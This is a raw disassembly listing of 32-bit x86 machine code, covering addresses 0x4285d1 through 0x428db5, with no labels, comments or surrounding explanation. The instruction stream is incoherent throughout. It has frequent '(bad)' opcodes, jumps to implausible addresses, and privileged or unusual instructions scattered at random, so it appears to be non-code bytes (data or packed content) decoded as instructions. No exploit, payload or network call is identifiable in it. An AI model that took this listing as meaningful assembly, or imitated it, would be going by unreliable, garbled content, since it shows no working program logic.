  4285d1:	dec    DWORD PTR [ebp-0x1]
  4285d4:	mov    edi,edi
  4285d6:	dec    eax
  4285d7:	clc    
  4285d8:	call   DWORD PTR [ebp-0x73]
  4285db:	lea    esi,[eax+0x51ffff88]
  4285e1:	lea    ecx,[ebp-0x78]
  4285e4:	test   WORD PTR [ebp-0x2],ax
  4285eb:	popf   
  4285ec:	push   eax
  4285ed:	add    BYTE PTR [ecx-0x77],dl
  4285f0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285f6:	cwde   
  4285f7:	mov    al,0x32
  4285f9:	inc    DWORD PTR [ebx]
  4285fb:	push   eax
  4285fc:	push   ecx
  4285fd:	inc    ebp
  4285fe:	shl    BYTE PTR [ebx],1
  428600:	lea    eax,[ebx]
  428602:	call   DWORD PTR [eax-0x1]
  428605:	test   DWORD PTR [ebx],esi
  428607:	inc    DWORD PTR [eax-0x1]
  42860a:	(bad)  
  42860b:	(bad)  
  42860c:	(bad)  
  42860d:	clc    
  42860e:	call   DWORD PTR [ebp+0x50]
  428611:	jmp    0xcb878b
  428616:	inc    esp
  428617:	jnp    0x428618
  428619:	add    BYTE PTR [ecx-0x484f73],cl
  42861f:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428625:	mov    eax,DWORD PTR [ecx]
  428627:	data16 add BYTE PTR [ebp-0xb50077],al
  42862e:	inc    eax
  428630:	lea    esp,[esi+0x14]
  428633:	test   DWORD PTR [ecx-0xb301],ecx
  428639:	inc    edi
  42863a:	(bad)  
  42863b:	dec    si
  42863d:	test   edi,edi
  42863f:	(bad)  
  428640:	cmp    eax,0xc74f73ff
  428645:	mov    edx,DWORD PTR [edx-0x7d]
  428648:	push   DWORD PTR [ebx+0x56328939]
  42864e:	(bad)  
  42864f:	call   FWORD PTR [esi-0x47]
  428652:	inc    DWORD PTR ds:0x893c00ea
  428658:	(bad)  
  428659:	pop    eax
  42865a:	mov    ah,0xff
  42865c:	(bad)  
  42865d:	mov    ecx,0x5745
  428662:	dec    DWORD PTR [ecx-0xf7a501]
  428668:	(bad)  
  428669:	mov    ecx,0x456108
  42866e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428674:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42867a:	inc    BYTE PTR gs:[eax]
  42867d:	inc    DWORD PTR [ebp-0x73]
  428680:	cmp    dh,bh
  428682:	pushf  
  428683:	inc    edi
  428685:	mov    ebx,eax
  428687:	hlt    
  428688:	test   DWORD PTR [ecx-0xbab708],ecx
  42868e:	cmp    al,0xbe
  428690:	pushf  
  428691:	or     bh,al
  428693:	pop    es
  428694:	lock into 
  428696:	test   eax,eax
  428698:	clc    
  428699:	mov    ebx,0x387245
  42869e:	lahf   
  42869f:	retf   
  4286a0:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  4286a6:	add    edi,edi
  4286a8:	add    BYTE PTR [ecx+0x45],dl
  4286ab:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  4286b2:	mov    edx,DWORD PTR [ecx-0x74]
  4286b5:	inc    DWORD PTR [eax]
  4286b7:	cld    
  4286b8:	mov    eax,DWORD PTR [ebp-0x6f0175]
  4286be:	add    BYTE PTR [ebp-0x1b0177],al
  4286c4:	jge    0x42870b
  4286c6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286cc:	sbb    BYTE PTR [esi+0x55],ah
  4286cf:	xchg   ebp,eax
  4286d0:	call   0x4281d4
  4286d5:	push   edi
  4286d6:	inc    ebp
  4286d7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286de:	cmp    al,0x85
  4286e0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286e4:	test   DWORD PTR [edi+0x74],ecx
  4286e7:	dec    edi
  4286e8:	inc    DWORD PTR [ebp-0xf70004]
  4286ee:	dec    DWORD PTR [edi-0x75]
  4286f1:	dec    edi
  4286f2:	cld    
  4286f3:	test   DWORD PTR [eax+0xff01ff],eax
  4286f9:	icebp  
  4286fa:	add    BYTE PTR [edi-0x3a],cl
  4286fd:	test   ebx,eax
  4286ff:	inc    BYTE PTR [ebp-0x1]
  428702:	jne    0x428704
  428704:	mov    eax,DWORD PTR [eax]
  428706:	cld    
  428707:	xor    BYTE PTR [ecx+0x500155],cl
  42870d:	push   ebp
  42870e:	xor    DWORD PTR [ecx+0x45011c80],ecx
  428714:	add    BYTE PTR [ebp+0x35e90f50],al
  42871a:	add    al,BYTE PTR [eax]
  42871c:	add    BYTE PTR [ebx-0x38fe4f80],al
  428722:	add    ah,ch
  428724:	or     BYTE PTR [ebp+0x4501f845],dh
  42872a:	jmp    0xde8a27
  42872f:	(bad)  
  428730:	nop    ecx
  428733:	test   DWORD PTR [ebp+0x4502f8],eax
  428739:	cmp    cl,BYTE PTR [ebp-0x64]
  42873c:	mov    eax,edi
  42873e:	mov    ebx,DWORD PTR [eax+edx*2]
  428741:	add    eax,0x45fef885
  428746:	dec    DWORD PTR [ebx+0x339445]
  42874c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428752:	dec    DWORD PTR [ebx-0x460f0375]
  428758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428759:	add    esi,edi
  42875b:	add    bh,bh
  42875d:	rdpmc  
  42875f:	add    BYTE PTR [ebx],0x1
  428762:	mov    DWORD PTR [eax],eax
  428764:	add    al,0x45
  428766:	dec    DWORD PTR [ecx-0x360b3373]
  42876c:	dec    DWORD PTR [esi]
  42876e:	push   eax
  42876f:	jne    0x4287b6
  428771:	mov    esi,DWORD PTR [ebx]
  428773:	cld    
  428774:	add    ebp,ebx
  428776:	push   eax
  428777:	inc    DWORD PTR [ebp-0x75]
  42877a:	add    eax,0x800e4
  42877f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428785:	mov    DWORD PTR [ecx],eax
  428787:	sbb    al,0x0
  428789:	leave  
  42878a:	test   DWORD PTR [edi-0x2],eax
  42878d:	jne    0x42878e
  42878f:	call   0xff437294
  428794:	xor    BYTE PTR [ebp+0x4d],al
  428797:	mov    edi,edi
  428799:	enter  0x8,0x4d
  42879d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4287a3:	mov    eax,DWORD PTR [eax]
  4287a5:	cld    
  4287a6:	add    DWORD PTR [ecx],ebx
  4287a8:	inc    ebp
  4287a9:	dec    ebp
  4287aa:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4287b0:	inc    eax
  4287b1:	dec    DWORD PTR [ecx-0x270375]
  4287b7:	add    BYTE PTR [ebx-0x39d72701],cl
  4287bd:	xchg   ecx,eax
  4287be:	ret    
  4287bf:	add    BYTE PTR [ebp-0x830075],al
  4287c5:	add    BYTE PTR [ebp-0x75],al
  4287c8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ce:	lea    edi,[edi-0xc]
  4287d1:	add    bh,bh
  4287d3:	mov    edx,DWORD PTR [eax-0x7b]
  4287d6:	inc    ebp
  4287d7:	rdpmc  
  4287d9:	jne    0x4287de
  4287db:	add    BYTE PTR [eax-0x75],dl
  4287de:	inc    ebp
  4287df:	clc    
  4287e0:	add    eax,0x400009
  4287e5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287eb:	mov    eax,DWORD PTR [ecx]
  4287ed:	in     al,dx
  4287ee:	add    dh,al
  4287f0:	test   ebx,eax
  4287f2:	inc    BYTE PTR [ebp-0xff0001]
  4287f8:	add    BYTE PTR [ebp-0x43],al
  4287fb:	cmp    esi,0xfffffff8
  4287fe:	(bad)  
  4287ff:	push   DWORD PTR [eax]
  428801:	add    BYTE PTR [ebp-0x3a],dl
  428804:	test   ebx,eax
  428806:	je     0x42878d
  428808:	mov    edi,edi
  42880a:	sbb    al,0xff
  42880c:	test   DWORD PTR gs:[eax],eax
  42880f:	(bad)  
  428810:	js     0x428811
  428812:	add    BYTE PTR [ebx-0x39b20bdd],cl
  428818:	sub    eax,ebx
  42881a:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428820:	add    eax,DWORD PTR [eax]
  428822:	dec    ebp
  428823:	push   eax
  428824:	mov    al,BYTE PTR [ebp+0x1]
  428827:	mov    eax,DWORD PTR [ebp-0x68]
  42882a:	mov    eax,DWORD PTR [eax]
  42882c:	sbb    bh,al
  42882e:	or     ah,dh
  428830:	dec    ebp
  428831:	inc    DWORD PTR [eax+0x4]
  428834:	push   ecx
  428835:	add    BYTE PTR [edx-0x1],dh
  428838:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42883e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428848:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42884e:	push   ecx
  42884f:	cmp    BYTE PTR [ebx],al
  428851:	inc    ebp
  428852:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428858:	(bad)  
  428859:	(bad)  
  42885a:	in     al,0xff
  42885c:	add    BYTE PTR [ebp+0x0],al
  42885f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428865:	add    al,bh
  428867:	(bad)  
  428868:	jmp    0x8d85:0x74b0558d
  42886f:	dec    DWORD PTR [eax]
  428871:	call   DWORD PTR [ebp-0x7b]
  428874:	mov    edi,esi
  428876:	lock call DWORD PTR [ebp-0x75]
  42887a:	mov    esi,esp
  42887c:	mov    ah,0xc6
  42887e:	mov    bh,0xc3
  428880:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428886:	add    DWORD PTR [eax],0x450050ff
  42888c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428892:	inc    edi
  428894:	push   esp
  428896:	jmp    0xcd00:0x680481ff
  42889d:	mov    DWORD PTR [ebx],esi
  42889f:	clc    
  4288a0:	cmp    edi,0xff9cff3b
  4288a6:	jne    0x4288b0
  4288a8:	mov    eax,eax
  4288aa:	add    esi,DWORD PTR [eax]
  4288ac:	int3   
  4288ad:	inc    ebp
  4288ae:	cmp    al,0x83
  4288b0:	add    BYTE PTR [eax],bl
  4288b2:	adc    DWORD PTR [ebx+0x768b5055],eax
  4288b8:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4288be:	mov    edi,eax
  4288c0:	cmp    BYTE PTR [ebp+0x45],cl
  4288c3:	jmp    0x428850
  4288c5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288c8:	inc    ebp
  4288c9:	or     al,0x2
  4288cb:	dec    DWORD PTR [ebp+0x18]
  4288ce:	jne    0x428925
  4288d0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288d6:	mov    edi,DWORD PTR [ebx]
  4288d8:	in     al,0x50
  4288da:	xchg   ecx,eax
  4288db:	jmp    0x342d7e0
  4288e0:	adc    al,0x8b
  4288e2:	inc    ebp
  4288e3:	mov    al,ds:0x8b04008b
  4288e8:	push   ebp
  4288e9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288ef:	push   ebp
  4288f0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288f6:	inc    ebp
  4288f7:	dec    ebp
  4288f8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288fe:	mov    DWORD PTR [eax],0xe9ff00f4
  428904:	add    al,0x0
  428906:	add    BYTE PTR [eax],al
  428908:	mov    eax,edx
  42890a:	push   eax
  42890b:	rol    DWORD PTR [ebp-0xf0177],1
  428911:	bound  eax,QWORD PTR [ebp+0x50]
  428914:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  42891a:	add    BYTE PTR [ecx+0x558df0ff],cl
  428920:	mov    al,0xf
  428922:	test   DWORD PTR [edx],edx
  428924:	call   DWORD PTR [ebp-0x7a0001]
  42892a:	(bad)  
  42892b:	loop   0x42892c
  42892d:	jnp    0xc6987d33
  428933:	mov    eax,ebx
  428935:	cmp    al,0x8b
  428937:	(bad)  
  428938:	cld    
  428939:	shr    esi,0xc
  42893c:	add    dl,al
  42893e:	push   eax
  42893f:	lea    eax,[ebp-0x1]
  428942:	mov    edx,esi
  428944:	cwde   
  428945:	cli    
  428946:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42894c:	or     BYTE PTR [eax],cl
  42894e:	inc    ebp
  42894f:	dec    ebp
  428950:	inc    DWORD PTR [ebx+0x74803914]
  428956:	add    DWORD PTR [ebx+0x451800],ecx
  42895c:	call   DWORD PTR [eax+edx*1]
  42895f:	add    ecx,DWORD PTR [ebp-0x34]
  428962:	push   edi
  428963:	adc    al,0x8
  428965:	mov    edx,DWORD PTR [ebp-0x14]
  428968:	mov    ecx,DWORD PTR [ebp+0x18]
  42896b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42896f:	inc    DWORD PTR [eax+esi*8]
  428972:	inc    ebp
  428973:	stos   BYTE PTR es:[edi],al
  428974:	mov    edx,DWORD PTR [ebp-0x4]
  428977:	add    DWORD PTR [ebp-0x1c],eax
  42897a:	mov    edx,DWORD PTR [ebp-0x70]
  42897d:	cmp    eax,DWORD PTR [eax]
  42897f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428980:	mov    eax,DWORD PTR [eax]
  428982:	cld    
  428983:	jae    0x428905
  428985:	add    eax,DWORD PTR [ecx]
  428987:	clc    
  428988:	add    BYTE PTR [eax+0x30],dl
  42898b:	mov    DWORD PTR [ecx],esi
  42898d:	clc    
  42898e:	pop    ds
  42898f:	inc    ebp
  428990:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428996:	(bad)  
  428997:	push   DWORD PTR [edi]
  428999:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42899f:	(bad)  
  4289a0:	jae    0x4289a1
  4289a2:	mov    eax,DWORD PTR [ebp-0x740175]
  4289a8:	sub    eax,DWORD PTR [eax]
  4289aa:	add    eax,DWORD PTR [eax]
  4289ac:	mov    DWORD PTR [ecx+0x5f],eax
  4289af:	mov    DWORD PTR [ebx-0x4],ebx
  4289b2:	ret    0xff
  4289b5:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4289bb:	ret    
  4289bc:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289c2:	add    BYTE PTR [ebp-0x7d],al
  4289c5:	mov    DWORD PTR [eax],eax
  4289c7:	add    al,0x84
  4289c9:	inc    DWORD PTR [ecx]
  4289cb:	lea    eax,[eax]
  4289cd:	hlt    
  4289ce:	sar    bh,cl
  4289d0:	test   BYTE PTR [eax+0x1],dl
  4289d3:	inc    ebp
  4289d4:	add    BYTE PTR [ebx],dh
  4289d6:	test   BYTE PTR [ebx],0x84
  4289d9:	push   eax
  4289da:	add    BYTE PTR [ebp+0x0],al
  4289dd:	add    eax,0x86
  4289e2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289e8:	add    BYTE PTR [ecx],al
  4289ea:	add    BYTE PTR [eax],al
  4289ec:	mov    esi,0x550030
  4289f1:	mov    ecx,DWORD PTR [edi]
  4289f3:	cld    
  4289f4:	fidiv  DWORD PTR [ebp+0x0]
  4289f7:	mov    edi,DWORD PTR [ecx]
  4289f9:	xor    BYTE PTR [eax+eax*1],0x84
  4289fd:	add    eax,DWORD PTR [eax]
  4289ff:	sbb    BYTE PTR [eax],al
  428a01:	jne    0x4289b4
  428a03:	mov    eax,DWORD PTR [ecx]
  428a05:	sbb    BYTE PTR [eax],al
  428a07:	mov    DWORD PTR [ebp-0x1],esp
  428a0a:	add    BYTE PTR [eax+0x30e45ca],bh
  428a10:	ret    0xb7fc
  428a13:	dec    ebp
  428a14:	or     al,0x89
  428a16:	dec    ebp
  428a17:	cld    
  428a18:	cmovne ecx,DWORD PTR [eax-0x75]
  428a1c:	add    edi,esp
  428a1e:	seto   BYTE PTR [esi-0x72ffffff]
  428a25:	inc    ebp
  428a26:	adc    al,0x8b
  428a28:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a2f:	cmp    DWORD PTR [edi+0x72],edx
  428a32:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a38:	gs cmp al,0x0
  428a3b:	je     0x428a13
  428a3d:	push   eax
  428a3e:	sar    BYTE PTR [eax],1
  428a40:	mov    bh,0x3e
  428a42:	push   cs
  428a43:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a49:	add    DWORD PTR [ecx+0x12],ebp
  428a4c:	dec    edx
  428a4d:	(bad)  
  428a4e:	mov    eax,edx
  428a50:	in     al,dx
  428a51:	adc    DWORD PTR [ecx],esi
  428a53:	pop    esi
  428a54:	inc    ecx
  428a55:	leave  
  428a56:	or     DWORD PTR [eax],ebx
  428a58:	gs push ebp
  428a5a:	add    ah,ch
  428a5c:	into   
  428a5d:	in     al,dx
  428a5e:	enter  0xb756,0xf0
  428a62:	push   cs
  428a63:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a6d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a73:	jnp    0x74430f7b
  428a79:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428a7f:	add    BYTE PTR [edi],cl
  428a81:	mov    edi,DWORD PTR [ecx-0x78]
  428a84:	ltr    WORD PTR [ecx-0x7b]
  428a88:	dec    DWORD PTR [edi]
  428a8a:	clc    
  428a8b:	out    0x45,eax
  428a8d:	add    BYTE PTR [eax],cl
  428a8f:	cmp    ebx,0xffffff8c
  428a92:	jge    0x428a94
  428a94:	jb     0x428aa6
  428a96:	je     0x518b16
  428a9c:	pop    edx
  428a9d:	push   esi
  428a9e:	mov    ecx,DWORD PTR [edi]
  428aa0:	in     al,dx
  428aa1:	rol    DWORD PTR [ebp+0x0],1
  428aa4:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428aab:	cmp    DWORD PTR [ecx],0xfffffff0
  428aae:	hlt    
  428aaf:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428ab5:	(bad)  
  428ab7:	push   eax
  428ab8:	jns    0xb8426f36
  428abe:	lock push cs
  428ac0:	ror    edx,0x3
  428ac3:	test   BYTE PTR [ecx+0x5500e800],cl
  428ac9:	dec    eax
  428aca:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428ace:	(bad)  
  428acf:	mov    esi,0x7f33ff5f
  428ad4:	inc    eax
  428ad5:	test   DWORD PTR [edx],eax
  428ad7:	je     0x428a99
  428ad9:	mov    ecx,ecx
  428adb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428adf:	and    eax,DWORD PTR [eax+0xf0103]
  428ae5:	jp     0x428ad3
  428ae7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428aeb:	add    edx,DWORD PTR [edi+0x74]
  428aee:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428af4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428afa:	je     0x428a7f
  428afc:	cmp    eax,edi
  428afe:	js     0x428b23
  428b00:	add    eax,0xeb0fc003
  428b05:	jns    0x428a92
  428b07:	vmread DWORD PTR [ecx+0x45],ebx
  428b0b:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428b11:	adc    al,0x8b
  428b13:	jge    0x428b29
  428b15:	mov    edi,DWORD PTR [eax-0x4]
  428b18:	add    edi,DWORD PTR [edi]
  428b1a:	or     bh,bh
  428b1c:	push   ebp
  428b1d:	push   es
  428b1e:	mov    DWORD PTR [ebp-0x4],ebx
  428b21:	add    edi,esi
  428b23:	pop    es
  428b24:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b2a:	mov    DWORD PTR [esp+esi*8],ecx
  428b2d:	inc    ebp
  428b2e:	pop    ebp
  428b2f:	xor    DWORD PTR [esi-0x4],0x3b
  428b33:	add    edx,DWORD PTR [ecx+edi*1]
  428b36:	push   es
  428b37:	clc    
  428b38:	mov    bh,0xdb
  428b3a:	jp     0x428af3
  428b3c:	add    cl,BYTE PTR [esi]
  428b3e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b44:	test   edi,edi
  428b46:	je     0x428b3c
  428b48:	mov    eax,ecx
  428b4a:	or     BYTE PTR [ebx],al
  428b4c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b52:	jbe    0x428bc6
  428b54:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b5a:	add    ecx,DWORD PTR [esi]
  428b5c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b62:	add    eax,DWORD PTR [ebx-0x287af783]
  428b68:	je     0x428bb7
  428b6a:	mov    DWORD PTR [ecx],edi
  428b6c:	mov    esi,eax
  428b6e:	hlt    
  428b6f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b76:	jb     0x428b38
  428b78:	jmp    0x428b65
  428b7a:	xor    esi,DWORD PTR [ebx]
  428b7c:	pop    edi
  428b7d:	pop    esi
  428b7e:	pop    ebx
  428b7f:	ret    
  428b80:	ret    0x8b
  428b83:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b89:	cmp    DWORD PTR [eax],0xc
  428b8c:	pushf  
  428b8d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b93:	(bad)  
  428b95:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428b9c:	dec    ebp
  428b9d:	ret    
  428b9e:	mov    edi,DWORD PTR [esi-0x4]
  428ba1:	pop    eax
  428ba2:	dec    ebp
  428ba3:	jne    0x428b30
  428ba5:	xor    edi,esp
  428ba7:	inc    eax
  428ba8:	dec    ebp
  428ba9:	jbe    0x428bfe
  428bab:	inc    eax
  428bac:	pop    ebp
  428bad:	add    edx,DWORD PTR [esi+0x8]
  428bb0:	push   eax
  428bb1:	dec    eax
  428bb2:	push   ecx
  428bb3:	mov    eax,edi
  428bb5:	and    al,0xf0
  428bb7:	jo     0x428ba4
  428bb9:	mov    eax,DWORD PTR [ebx]
  428bbb:	sbb    BYTE PTR [ebp+0x4d],cl
  428bbe:	mov    eax,DWORD PTR [ebx]
  428bc0:	nop
  428bc1:	or     BYTE PTR [eax],al
  428bc3:	jne    0x428c1c
  428bc5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bcb:	cld    
  428bcc:	xor    edi,edi
  428bce:	add    edi,DWORD PTR [ebp+0x3]
  428bd1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bd7:	js     0x428b5d
  428bd9:	jae    0x428bdd
  428bdb:	(bad)  
  428bdd:	xor    al,0x5d
  428bdf:	jmp    0x428b6c
  428be1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428be8:	fdecstp 
  428bea:	test   BYTE PTR [edi],ah
  428bec:	add    bh,BYTE PTR [ebp+0x0]
  428bef:	add    ebx,DWORD PTR [ebp-0x77]
  428bf2:	mov    edi,eax
  428bf4:	cmp    al,0x0
  428bf7:	adc    dh,BYTE PTR [ebx]
  428bf9:	jge    0x428bfe
  428bfb:	mov    edi,DWORD PTR [ebx]
  428bfd:	jl     0x428c0e
  428bff:	clc    
  428c00:	dec    edi
  428c01:	jge    0x428c03
  428c03:	mov    eax,DWORD PTR [ebx]
  428c05:	jb     0x428c0f
  428c07:	mov    ecx,DWORD PTR [ebp-0x8]
  428c0a:	mov    edi,edi
  428c0c:	xor    edx,DWORD PTR [eax]
  428c0e:	add    edi,DWORD PTR [ebx]
  428c10:	mov    DWORD PTR [ebp-0x10],edi
  428c13:	inc    edi
  428c14:	pop    ebp
  428c15:	jge    0x428c52
  428c17:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428c1b:	mov    edx,0xc05d87f0
  428c20:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c24:	fimul  WORD PTR [eax]
  428c26:	fist   WORD PTR [ebp+0x1c]
  428c29:	in     al,dx
  428c2a:	jne    0x428c18
  428c2c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c32:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c36:	fdivp  st(0),st
  428c38:	fild   WORD PTR [ebp+0x4510f85c]
  428c3e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c44:	inc    ebp
  428c45:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c4b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c4e:	adc    al,0x8b
  428c50:	rcl    DWORD PTR [eax],0x48
  428c53:	mov    esi,0x7080803
  428c58:	fiadd  WORD PTR [ebp+0x4d]
  428c5b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c61:	cld    
  428c62:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c68:	mov    DWORD PTR [edi+0x872dc],edi
  428c6e:	xlat   BYTE PTR ds:[ebx]
  428c6f:	into   
  428c70:	ffreep st(6)
  428c72:	retf   0x6c7
  428c75:	iret   
  428c76:	dec    ebp
  428c77:	inc    ebp
  428c78:	mov    DWORD PTR [ebx],edi
  428c7a:	fmul   QWORD PTR [edi]
  428c7c:	dec    ebp
  428c7d:	jnp    0x428cb2
  428c7f:	add    BYTE PTR [ebx],al
  428c81:	mov    ecx,DWORD PTR [esp+edi*8]
  428c84:	inc    ebp
  428c85:	dec    ebp
  428c86:	lea    esi,[ebx]
  428c88:	add    DWORD PTR [ebx],eax
  428c8a:	jb     0x428cc7
  428c8c:	add    BYTE PTR [edi],cl
  428c8e:	inc    ebp
  428c8f:	imul   eax,edi,0x858bd800
  428c95:	cld    
  428c96:	clc    
  428c97:	mov    DWORD PTR [ebp+0x0],eax
  428c9a:	inc    DWORD PTR [eax]
  428c9c:	or     al,0xde
  428c9e:	sbb    bh,0x1
  428ca1:	retf   
  428ca2:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428ca9:	dec    ebp
  428caa:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428cb0:	enter  0x12de,0xdf
  428cb4:	inc    ebp
  428cb5:	pop    ebp
  428cb6:	dec    DWORD PTR [ebx-0x257f0ff4]
  428cbc:	add    DWORD PTR [edx],edx
  428cbe:	add    BYTE PTR [ebp+0x50],dl
  428cc1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428cc7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428ccd:	or     ah,al
  428ccf:	pop    ss
  428cd0:	cdq    
  428cd1:	push   ebp
  428cd2:	clc    
  428cd3:	mov    eax,DWORD PTR [ebp-0x4]
  428cd6:	xor    edx,edx
  428cd8:	add    esi,DWORD PTR [ebx]
  428cda:	cmp    eax,DWORD PTR [ebx]
  428cdc:	hlt    
  428cdd:	cmp    DWORD PTR [ebx],esp
  428cdf:	or     al,BYTE PTR [ebp+0xf]
  428ce2:	mov    eax,DWORD PTR [edx]
  428ce4:	loopne 0x428ce6
  428ce6:	(bad)  
  428ce7:	mov    ecx,esi
  428ce9:	cld    
  428cea:	pushf  
  428ceb:	pop    ebp
  428cec:	cwde   
  428ced:	mov    esi,DWORD PTR [edx]
  428cef:	lock mov eax,eax
  428cf2:	adc    BYTE PTR [ebx],al
  428cf4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cfb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428d01:	dec    ebp
  428d02:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428d08:	(bad)  
  428d09:	iret   
  428d0a:	inc    ebp
  428d0b:	(bad)  
  428d0c:	jne    0x428d5b
  428d0e:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428d14:	(bad)  
  428d15:	cmp    ebx,eax
  428d17:	je     0x428c9f
  428d19:	add    edi,edi
  428d1b:	or     bh,bh
  428d1d:	dec    ebp
  428d1e:	inc    ebp
  428d1f:	mov    esi,DWORD PTR [ebx]
  428d21:	cld    
  428d22:	add    ecx,esi
  428d24:	cmp    ecx,DWORD PTR [eax-0xc]
  428d27:	mov    edx,DWORD PTR [edi]
  428d29:	or     BYTE PTR [ebp-0x7c],al
  428d2c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d32:	test   BYTE PTR [eax+ebx*4],cl
  428d35:	inc    ebp
  428d36:	xor    bh,BYTE PTR ds:0x8be89c89
  428d3c:	out    dx,eax
  428d3d:	adc    BYTE PTR [eax],al
  428d3f:	jne    0x428d08
  428d41:	mov    ebp,esp
  428d43:	fcomp  DWORD PTR [ebx]
  428d45:	add    BYTE PTR [ecx],al
  428d47:	inc    DWORD PTR [ebp-0x75]
  428d4a:	mov    ?,esp
  428d4c:	add    al,0xce
  428d4e:	mov    ecx,edi
  428d50:	cld    
  428d51:	inc    ebp
  428d52:	fidivr WORD PTR [ebx]
  428d54:	fbstp  TBYTE PTR [ebp-0x3e]
  428d57:	mov    eax,DWORD PTR [eax]
  428d59:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d5f:	fadd   st,st(7)
  428d61:	add    BYTE PTR [ebp-0x1],al
  428d64:	mov    ecx,DWORD PTR [esp+edi*8]
  428d67:	inc    ebp
  428d68:	mov    bh,0xc7
  428d6b:	loopne 0x428db2
  428d6d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d73:	add    DWORD PTR [ebx],esi
  428d75:	pushf  
  428d76:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d7c:	mov    eax,edi
  428d7e:	cwde   
  428d7f:	inc    ebp
  428d80:	inc    ebp
  428d81:	jne    0x428d0e
  428d83:	mov    esp,esp
  428d85:	clc    
  428d86:	add    al,0x4d
  428d88:	mov    DWORD PTR [ebx],esi
  428d8a:	or     al,0x33
  428d8c:	inc    ebp
  428d8d:	lea    ecx,[ebx-0x398d13fd]
  428d93:	add    bh,al
  428d95:	inc    ebp
  428d96:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d9d:	add    ebp,esp
  428d9f:	shufps xmm1,xmm3,0xc7
  428da3:	(bad)  
  428da4:	jmp    0x7487c8cd
  428da9:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428daf:	hlt    
  428db0:	mov    ecx,DWORD PTR [edi]
  428db2:	fadd   DWORD PTR [ebp+0x0]
  428db5:	xor    ecx,DWORD PTR [edi]
